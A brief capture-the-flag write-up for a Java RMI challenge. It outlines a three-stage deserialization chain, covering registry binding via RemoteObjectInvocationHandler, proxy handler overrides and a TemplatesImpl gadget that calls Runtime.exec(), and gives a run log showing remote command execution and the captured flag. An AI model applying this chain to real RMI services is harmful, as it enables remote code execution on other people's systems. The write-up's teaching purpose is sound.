# 3rmi

1. You can use invoke (through a `RemoteObjectInvocationHandler`) to call stuff directly on registry -> free bind
2. RMI creates `sun.proxy.$Proxy` classes dynamically when deserializing objects
3. Bind our exploit class and overwrite some local method handlers
  a. `sayHello` becomes `getStage1Payload` -> returns a `Gadget` which will execute payload on deserialization (even though remote wants a String)
    i. The `user` in `Gadget` is a `RemoteObjectInvocationHandler` so we can return a custom for `getGirlFriend`
  b. `getGirlFriend` becomes `getStage2Payload` -> gets executed by Gadget and returns an instance of `Friend` and `Templates` (class created dynamically)
    i. The generated proxy uses a `MyInvocationHandler` so we can control which object gets invoked (another `RemoteObjectInvocationHandler`)
    ii. This `RemoteObjectInvocationHandler` calls back to us again, through another dynamic class that implements `FactoryInter` and `Remote`
  c. `getObject` becomes `getStage3Payload` which returns a `TemplatesImpl` that dynamically creates a class that will `Runtime.getRuntime().exec()` a single command and return it via `sayHello`


```
HOSTNAME=ip REMOTE=47.90.137.5 java -jar untitled.jar
[+] connected to remote registry
[+] found binding user_1663560183072
[+] found binding user_1663560318150
[+] found binding ctf
[+] found binding user_1663560179937
[+] found binding user_1663560303404
[+] binding user_1663560378567 to com.ctf.threermi.Exploit
[+] done!
<<< whoami
>>> ctf

<<< cat /flag
>>> flag{8a66704e47832bdfa8803b00fca726cf}
```
